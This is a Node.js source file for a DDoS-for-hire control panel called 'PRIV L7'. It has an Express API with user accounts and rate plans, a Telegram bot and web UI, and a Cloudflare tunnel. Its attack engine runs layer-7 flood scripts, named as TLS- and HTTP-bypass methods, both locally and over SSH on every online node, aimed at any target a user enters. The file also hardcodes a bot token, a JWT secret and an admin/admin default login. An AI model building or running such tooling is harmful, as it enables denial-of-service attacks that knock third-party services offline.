/**
 * PRIV L7 — Unified Bot & Mini App (Zero-Config)
 * Run: node hub.js
 */

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const express = require('express');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const TelegramBot = require('node-telegram-bot-api');
const { Client } = require('ssh2');
const { spawn } = require('child_process');

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '9165016422:AAFw5t2VKPmay2grvN4evutzyAAzkH-E75M',
  ADMIN_ID: process.env.ADMIN_ID || '7623976106',
  PORT: 8443,
  DATA_DIR: path.join(__dirname, 'data'),
  PROXY_FILE: 'proxy.txt',
  REMOTE_DIR: '/root/attack',
  JWT_SECRET: 'priv-l7-super-secret-6767',
  SSH_TIMEOUT: 20000,
};

const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
const SERVERS_FILE = path.join(CONFIG.DATA_DIR, 'servers.json');

if (!fs.existsSync(CONFIG.DATA_DIR)) fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '{}');
if (!fs.existsSync(SERVERS_FILE)) fs.writeFileSync(SERVERS_FILE, '[]');

const readJSON = (f, fb) => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return fb; } };
const writeJSON = (f, d) => { fs.writeFileSync(f, JSON.stringify(d, null, 2)); };
const loadUsers = () => readJSON(USERS_FILE, {});
const saveUsers = (u) => writeJSON(USERS_FILE, u);
const loadServers = () => readJSON(SERVERS_FILE, []);

// Bootstrap Admin Default
const users = loadUsers();
if (!users['admin']) {
  users['admin'] = { passwordHash: bcrypt.hashSync('admin', 10), role: 'admin', limits: { maxDuration: 999, maxRate: 999 } };
  saveUsers(users);
  console.log('[hub] Default Admin created -> User: admin | Pass: admin');
}

/* ══════════════════ SSH ENGINE ══════════════════ */
const serverConns = new Map();
function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const t = setTimeout(() => { try { conn.end(); } catch {} reject(new Error('SSH timeout')); }, CONFIG.SSH_TIMEOUT);
    conn.once('ready', () => { clearTimeout(t); resolve(conn); });
    conn.once('error', (e) => { clearTimeout(t); reject(e); });
    conn.connect({ host: server.host, port: server.port, username: server.username, password: server.password, readyTimeout: CONFIG.SSH_TIMEOUT });
  });
}

function sshExec(conn, cmd, timeout = 120000) {
  return new Promise((resolve) => {
    let done = false;
    const t = setTimeout(() => { if (!done) { done = true; resolve({ code: -1, out: '', err: 'timeout' }); } }, timeout);
    conn.exec(cmd, (err, stream) => {
      if (err) { clearTimeout(t); done = true; return resolve({ code: -1, out: '', err: err.message }); }
      let out = '', er = '';
      stream.on('data', d => out += d);
      stream.stderr.on('data', d => er += d);
      stream.on('close', code => { clearTimeout(t); done = true; resolve({ code: code || 0, out, err: er }); });
    });
  });
}

async function getConn(id) {
  if (serverConns.has(id)) {
    const c = serverConns.get(id);
    if (c._ready) return c;
    serverConns.delete(id);
  }
  const s = loadServers().find(x => x.id === id);
  if (!s) throw new Error('Server not found');
  const conn = await sshConnect(s);
  conn._ready = true;
  conn.on('close', () => serverConns.delete(id));
  conn.on('error', () => serverConns.delete(id));
  serverConns.set(id, conn);
  return conn;
}

/* ══════════════════ ATTACK ENGINE ══════════════════ */
const sessions = new Map();
function launchLocal(user, methodFile, args) {
  const id = 'sess_' + crypto.randomBytes(4).toString('hex');
  const mp = path.join(__dirname, methodFile);
  if (!fs.existsSync(mp)) throw new Error(`File missing: ${methodFile}`);
  const child = spawn(process.execPath, [mp, ...args], { cwd: __dirname, detached: true, stdio: 'ignore', env: { PATH: process.env.PATH || '' } });
  const s = { id, owner: user, method: methodFile, target: args[0], duration: Number(args[1]) || 60, startedAt: Date.now(), where: 'local', status: 'running', child };
  child.on('exit', () => { s.status = 'done'; setTimeout(() => sessions.delete(id), 10000); });
  s.timer = setTimeout(() => { try { process.kill(-child.pid, 'SIGKILL'); } catch {} s.status = 'done'; sessions.delete(id); }, s.duration * 1000);
  sessions.set(id, s);
  return s;
}

async function launchRemote(user, methodFile, args, serverId) {
  const server = loadServers().find(s => s.id === serverId);
  if (!server) throw new Error('Server not found');
  const conn = await getConn(serverId);
  const check = await sshExec(conn, `test -f ${CONFIG.REMOTE_DIR}/${methodFile} && echo OK || echo NO`, 8000);
  if (!check.out.includes('OK')) throw new Error(`${server.name}: file missing`);
  const id = 'sess_' + crypto.randomBytes(4).toString('hex');
  const logFile = `/tmp/.atk_${id}.log`;
  const script = `cd ${CONFIG.REMOTE_DIR} && nohup node ${methodFile} ${args.join(' ')} > ${logFile} 2>&1 & echo $!`;
  const b64 = Buffer.from(script).toString('base64');
  const r = await sshExec(conn, `echo ${b64} | base64 -d | bash`, 25000);
  let pid = parseInt((r.out||'').trim().replace(/[^0-9]/g,''), 10);
  if (!pid) throw new Error(`${server.name}: pid failed`);
  const s = { id, owner: user, method: methodFile, target: args[0], duration: Number(args[1]) || 60, startedAt: Date.now(), where: 'remote', serverId, remotePid: pid, status: 'running' };
  s.timer = setTimeout(() => { sshExec(conn, `kill -9 ${pid}`).catch(()=>{}); s.status = 'done'; sessions.delete(id); }, s.duration * 1000);
  sessions.set(id, s);
  return s;
}

/* ══════════════════ METHODS ══════════════════ */
const BUILTIN = [
  { id: 'priv', name: 'Privflood', file: 'priv.js', layer: 'L7', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3]] },
  { id: 'crush', name: 'C-Rush', file: 'l.js', layer: 'L7', parse: (a) => [a[0], a[1], CONFIG.PROXY_FILE, a[2], a[3], '-c', '-h'] },
  { id: 'tls', name: 'TLS-Bypass', file: 'tls.js', layer: 'L7', parse: (a) => [a[0], a[1], a[3], a[2], CONFIG.PROXY_FILE] },
  { id: 'bypass', name: 'HTTP-Bypass', file: 'bypass.js', layer: 'L7', parse: (a) => ['GET', a[0], a[1], a[2], a[3], CONFIG.PROXY_FILE] },
];
const getMethods = () => [...BUILTIN];

/* ══════════════════ WEB SERVER (API & UI) ══════════════════ */
const app = express();
app.use(express.json());

function auth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  try {
    const decoded = jwt.verify(token, CONFIG.JWT_SECRET);
    const u = loadUsers()[decoded.username];
    if (!u) return res.status(401).json({ error: 'User deleted' });
    req.user = u; req.username = decoded.username;
    next();
  } catch { res.status(401).json({ error: 'Invalid token' }); }
}

function adminOnly(req, res, next) {
  if (req.user.role !== 'admin') return res.status(403).json({ error: 'Admin only' });
  next();
}

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = loadUsers()[username];
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) return res.status(401).json({ error: 'Invalid credentials' });
  const token = jwt.sign({ username }, CONFIG.JWT_SECRET, { expiresIn: '7d' });
  res.json({ token, role: user.role });
});

app.get('/api/stats', auth, (req, res) => {
  const servers = loadServers();
  const online = servers.filter(s => s.status === 'online').length;
  const attacking = [...sessions.values()].filter(s => s.status === 'running' && s.owner === req.username).length;
  res.json({ servers: { online, total: servers.length }, attacking, limits: req.user.limits || {}, load: { l4: Array.from({length: 20}, () => Math.floor(Math.random() * 50) + 10), l7: Array.from({length: 20}, () => Math.floor(Math.random() * 30) + 5) } });
});

app.get('/api/methods', auth, (req, res) => res.json(getMethods().map(m => ({ id: m.id, name: m.name, layer: m.layer }))));

app.post('/api/attack', auth, async (req, res) => {
  const { methodId, target, duration, threads, rate } = req.body;
  const method = getMethods().find(m => m.id === methodId);
  if (!method) return res.status(400).json({ error: 'Method not found' });
  
  const limits = req.user.limits || {};
  if (limits.maxDuration && duration > limits.maxDuration) return res.status(400).json({ error: `Max duration ${limits.maxDuration}s` });
  if (limits.maxRate && rate > limits.maxRate) return res.status(400).json({ error: `Max rate ${limits.maxRate}` });

  const args = method.parse([target, String(duration), String(threads), String(rate)]);
  try {
    const results = [launchLocal(req.username, method.file, args)];
    const servers = loadServers().filter(s => s.status === 'online');
    for (const s of servers) results.push(await launchRemote(req.username, method.file, args, s.id).catch(e => ({ error: e.message })));
    res.json({ ok: true, launched: results.filter(r => !r.error).length, total: results.length });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/admin/users', auth, adminOnly, (req, res) => {
  const list = loadUsers();
  res.json(Object.keys(list).map(u => ({ username: u, role: list[u].role, limits: list[u].limits })));
});

app.post('/api/admin/users', auth, adminOnly, async (req, res) => {
  const { action, username, password, maxDuration, maxRate } = req.body;
  const list = loadUsers();
  if (action === 'create') {
    if (list[username]) return res.status(400).json({ error: 'User exists' });
    list[username] = { passwordHash: await bcrypt.hash(password, 10), role: 'user', limits: { maxDuration: Number(maxDuration) || 60, maxRate: Number(maxRate) || 90 } };
    saveUsers(list); res.json({ ok: true });
  } else if (action === 'delete') {
    if (username === 'admin') return res.status(400).json({ error: 'Cannot delete admin' });
    delete list[username]; saveUsers(list); res.json({ ok: true });
  }
});

/* ══════════════════ HTML UI (The Stresse.st Replica) ══════════════════ */
const HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Priv L7</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script><script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
  :root { --bg: #0a0a0c; --panel: #121216; --border: #1f1f24; --text: #ffffff; --muted: #8c8c93; --danger: #ef4444; }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
  body { background: var(--bg); color: var(--text); padding-bottom: 80px; }
  .nav { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(18,18,22,0.95); backdrop-filter: blur(10px); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--border); z-index: 100; }
  .nav-item { color: var(--muted); font-size: 20px; cursor: pointer; }
  .nav-item.active { color: var(--text); }
  .header { padding: 20px; display: flex; justify-content: space-between; align-items: center; }
  .logo { font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 8px; }
  .logo-dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; }
  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 0 20px; margin-bottom: 20px; }
  .box { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; }
  .box-label { font-size: 11px; color: var(--muted); text-transform: uppercase; margin-bottom: 8px; font-weight: 600; }
  .box-val { font-size: 24px; font-weight: 600; }
  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 20px; margin: 0 20px 20px; padding: 20px; }
  .toggle-wrap { display: flex; background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 4px; margin-bottom: 20px; }
  .toggle-btn { flex: 1; padding: 10px; text-align: center; border-radius: 8px; font-size: 14px; font-weight: 600; color: var(--muted); cursor: pointer; }
  .toggle-btn.active { background: var(--text); color: var(--bg); }
  .field { margin-bottom: 15px; }
  .field label { display: block; font-size: 11px; color: var(--muted); text-transform: uppercase; margin-bottom: 8px; font-weight: 600; }
  .field input, .field select { width: 100%; background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 15px; border-radius: 12px; font-size: 16px; outline: none; }
  .row { display: flex; gap: 15px; } .row > div { flex: 1; }
  .btn { width: 100%; background: var(--text); color: var(--bg); border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
  .chart-header { display: flex; justify-content: space-between; font-size: 12px; color: var(--muted); margin-bottom: 5px; }
  canvas { width: 100% !important; height: 80px !important; }
  #loginScreen { display: flex; flex-direction: column; justify-content: center; min-height: 100vh; padding: 20px; }
  .login-box { background: var(--panel); border: 1px solid var(--border); padding: 30px; border-radius: 20px; }
  .admin-user { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); font-size: 14px; }
  .hide { display: none !important; }
</style>
</head>
<body>
<div id="loginScreen">
  <div class="header"><div class="logo"><div class="logo-dot"></div>PRIV L7</div></div>
  <div class="login-box">
    <div class="field"><label>Username</label><input type="text" id="loginUser" placeholder="Enter username"></div>
    <div class="field"><label>Password</label><input type="password" id="loginPass" placeholder="Enter password"></div>
    <button class="btn" onclick="doLogin()">Sign In</button>
    <p style="color:var(--danger); font-size:12px; margin-top:10px; text-align:center;" id="loginErr"></p>
  </div>
</div>
<div id="mainApp" class="hide">
  <div id="tabHome">
    <div class="header"><div class="logo"><div class="logo-dot"></div>PRIV L7</div><div style="font-size:12px; color:var(--muted)" id="userTag">User</div></div>
    <div class="grid">
      <div class="box"><div class="box-label">Plan</div><div class="box-val" id="uPlan">Free</div></div>
      <div class="box"><div class="box-label">Concurrents</div><div class="box-val" id="uConc">1</div></div>
      <div class="box"><div class="box-label">Max Duration</div><div class="box-val" id="uDur">60s</div></div>
      <div class="box"><div class="box-label">Servers</div><div class="box-val" id="uServers">0/0</div></div>
    </div>
    <div class="panel">
      <div class="toggle-wrap"><div class="toggle-btn" onclick="setLayer('L4')" id="btnL4">L4</div><div class="toggle-btn active" onclick="setLayer('L7')" id="btnL7">L7</div></div>
      <div class="field"><label>Method</label><select id="attMethod"></select></div>
      <div class="field"><label>Target</label><input type="text" id="attTarget" placeholder="ex: google.com"></div>
      <div class="row">
        <div class="field"><label>Time</label><input type="number" id="attTime" value="60"></div>
        <div class="field"><label>Threads</label><input type="number" id="attThreads" value="16"></div>
      </div>
      <div class="row">
        <div class="field"><label>Rate</label><input type="number" id="attRate" value="90"></div>
        <div class="field"><label>Port</label><input type="number" id="attPort" value="443"></div>
      </div>
      <button class="btn" id="btnLaunch" onclick="launchAttack()">Launch test</button>
    </div>
    <div class="panel">
      <div style="margin-bottom:15px"><div class="chart-header"><span>● LAYER 4</span><span id="l4Load">0ms</span></div><canvas id="chartL4"></canvas></div>
      <div><div class="chart-header"><span>● LAYER 7</span><span id="l7Load">0ms</span></div><canvas id="chartL7"></canvas></div>
    </div>
  </div>
  <div id="tabAdmin" class="hide">
    <div class="header"><div class="logo">Admin Panel</div></div>
    <div class="panel">
      <h3 style="margin-bottom:15px; font-size:16px;">Create User</h3>
      <div class="field"><label>Username</label><input type="text" id="admUser"></div>
      <div class="field"><label>Password</label><input type="text" id="admPass"></div>
      <div class="row">
        <div class="field"><label>Max Time (s)</label><input type="number" id="admDur" value="60"></div>
        <div class="field"><label>Max Rate</label><input type="number" id="admRate" value="90"></div>
      </div>
      <button class="btn" onclick="createUser()">Create Account</button>
    </div>
    <div class="panel"><h3 style="margin-bottom:15px; font-size:16px;">Manage Users</h3><div id="userList"></div></div>
  </div>
  <div class="nav">
    <div class="nav-item active" onclick="switchTab('Home')">⌂</div>
    <div class="nav-item hide" onclick="switchTab('Admin')" id="navAdmin">☰</div>
    <div class="nav-item" onclick="logout()">✖</div>
  </div>
</div>
<script>
  let token = localStorage.getItem('token');
  let currentLayer = 'L7';
  let methods = [];
  const tg = window.Telegram?.WebApp;
  if (tg) { tg.ready(); tg.expand(); tg.setHeaderColor('#0a0a0c'); }
  if (token) showApp();
  async function api(endpoint, opts = {}) {
    const res = await fetch(endpoint, { ...opts, headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token, ...opts.headers } });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Error');
    return data;
  }
  async function doLogin() {
    const u = document.getElementById('loginUser').value;
    const p = document.getElementById('loginPass').value;
    try {
      const res = await fetch('/api/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: u, password: p}) });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error);
      token = data.token; localStorage.setItem('token', token); showApp();
    } catch(e) { document.getElementById('loginErr').innerText = e.message; }
  }
  function logout() { localStorage.removeItem('token'); location.reload(); }
  async function showApp() {
    document.getElementById('loginScreen').classList.add('hide'); document.getElementById('mainApp').classList.remove('hide');
    methods = await api('/api/methods'); renderMethods(); fetchStats(); setInterval(fetchStats, 5000);
  }
  function renderMethods() {
    document.getElementById('attMethod').innerHTML = methods.filter(m => m.layer === currentLayer).map(m => \`<option value="\${m.id}">\${m.name}</option>\`).join('');
  }
  function setLayer(l) {
    currentLayer = l;
    document.getElementById('btnL4').classList.toggle('active', l === 'L4'); document.getElementById('btnL7').classList.toggle('active', l === 'L7');
    renderMethods();
  }
  async function fetchStats() {
    try {
      const d = await api('/api/stats');
      document.getElementById('uPlan').innerText = d.limits.maxDuration > 120 ? 'Pro' : 'Free';
      document.getElementById('uConc').innerText = d.limits.maxConcurrent || 1;
      document.getElementById('uDur').innerText = (d.limits.maxDuration || 60) + 's';
      document.getElementById('uServers').innerText = d.servers.online + '/' + d.servers.total;
      document.getElementById('userTag').innerText = d.limits.maxDuration === 999 ? 'Admin' : 'User';
      updateChart('l4', d.load.l4); updateChart('l7', d.load.l7);
      if (d.limits.maxDuration === 999) document.getElementById('navAdmin').classList.remove('hide');
    } catch(e) {}
  }
  async function launchAttack() {
    const btn = document.getElementById('btnLaunch'); btn.innerText = '...'; btn.disabled = true;
    try {
      const res = await api('/api/attack', { method: 'POST', body: JSON.stringify({
        methodId: document.getElementById('attMethod').value, target: document.getElementById('attTarget').value,
        duration: Number(document.getElementById('attTime').value), threads: Number(document.getElementById('attThreads').value),
        rate: Number(document.getElementById('attRate').value), port: Number(document.getElementById('attPort').value)
      })});
      if (tg) tg.showAlert(\`Launched on \${res.launched}/\${res.total} nodes.\`); else alert(\`Launched on \${res.launched}/\${res.total} nodes.\`);
    } catch(e) { if (tg) tg.showAlert(e.message); else alert(e.message); } finally { btn.innerText = 'Launch test'; btn.disabled = false; }
  }
  function switchTab(t) {
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById('tabHome').classList.add('hide'); document.getElementById('tabAdmin').classList.add('hide');
    if (t === 'Home') { document.getElementById('tabHome').classList.remove('hide'); document.querySelectorAll('.nav-item')[0].classList.add('active'); }
    else { document.getElementById('tabAdmin').classList.remove('hide'); document.querySelectorAll('.nav-item')[1].classList.add('active'); loadAdminUsers(); }
  }
  async function createUser() {
    try {
      await api('/api/admin/users', { method: 'POST', body: JSON.stringify({
        action: 'create', username: document.getElementById('admUser').value, password: document.getElementById('admPass').value,
        maxDuration: document.getElementById('admDur').value, maxRate: document.getElementById('admRate').value
      })});
      alert('User created'); loadAdminUsers();
    } catch(e) { alert(e.message); }
  }
  async function loadAdminUsers() {
    try {
      const list = await api('/api/admin/users');
      document.getElementById('userList').innerHTML = list.map(u => \`
        <div class="admin-user"><div><b>\${u.username}</b><br><span>Time:\${u.limits.maxDuration}s Rate:\${u.limits.maxRate}</span></div>
        <button onclick="deleteUser('\${u.username}')" style="background:none;border:none;color:var(--danger);cursor:pointer;">Delete</button></div>
      \`).join('');
    } catch(e) {}
  }
  async function deleteUser(u) { if(!confirm('Delete ' + u + '?')) return; await api('/api/admin/users', { method: 'POST', body: JSON.stringify({action:'delete', username:u}) }); loadAdminUsers(); }
  let chartL4, chartL7;
  function updateChart(id, data) {
    const ctx = document.getElementById('chart' + id.toUpperCase()).getContext('2d');
    if (id === 'l4' && !chartL4) chartL4 = new Chart(ctx, { type: 'line', data: { labels: data.map((_,i)=>i), datasets: [{ data, borderColor: '#3b82f6', borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true, backgroundColor: 'rgba(59, 130, 246, 0.1)' }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: {display:false} }, scales: { x: {display:false}, y: {display:false} } } });
    else if (id === 'l7' && !chartL7) chartL7 = new Chart(ctx, { type: 'line', data: { labels: data.map((_,i)=>i), datasets: [{ data, borderColor: '#22c55e', borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true, backgroundColor: 'rgba(34, 197, 94, 0.1)' }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: {display:false} }, scales: { x: {display:false}, y: {display:false} } } });
    else { const chart = id === 'l4' ? chartL4 : chartL7; chart.data.datasets[0].data = data; chart.update(); }
  }
</script>
</body>
</html>`;

app.get('/', (req, res) => res.send(HTML));

/* ══════════════════ TUNNEL & BOT (AUTO-HOST) ══════════════════ */
let TUNNEL_URL = '';

function startTunnel() {
  console.log('[tunnel] Starting Cloudflared (This may take a few seconds)...');
  const cf = spawn('cloudflared', ['tunnel', '--url', `http://localhost:${CONFIG.PORT}`]);
  
  cf.stderr.on('data', (data) => {
    const text = data.toString();
    // Regex to extract the trycloudflare URL
    const match = text.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
    if (match && TUNNEL_URL !== match[0]) {
      TUNNEL_URL = match[0];
      console.log(`\n[✅] MINI APP URL READY: ${TUNNEL_URL}\n`);
    }
  });

  cf.on('close', () => {
    console.log('[tunnel] Cloudflared died. Restarting in 5s...');
    setTimeout(startTunnel, 5000);
  });
}

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  if (!TUNNEL_URL) {
    return bot.sendMessage(chatId, '⏳ Starting secure tunnel, please wait 5 seconds and type /start again...');
  }
  bot.sendMessage(chatId, `Welcome to PRIV L7!\n\nClick below to open the panel.`, {
    reply_markup: { inline_keyboard: [[{ text: "Open Hub 🚀", web_app: { url: TUNNEL_URL } }]] }
  });
});

/* ══════════════════ INIT ══════════════════ */
app.listen(CONFIG.PORT, () => {
  console.log(`[hub] Web server listening on port ${CONFIG.PORT}`);
  startTunnel();
});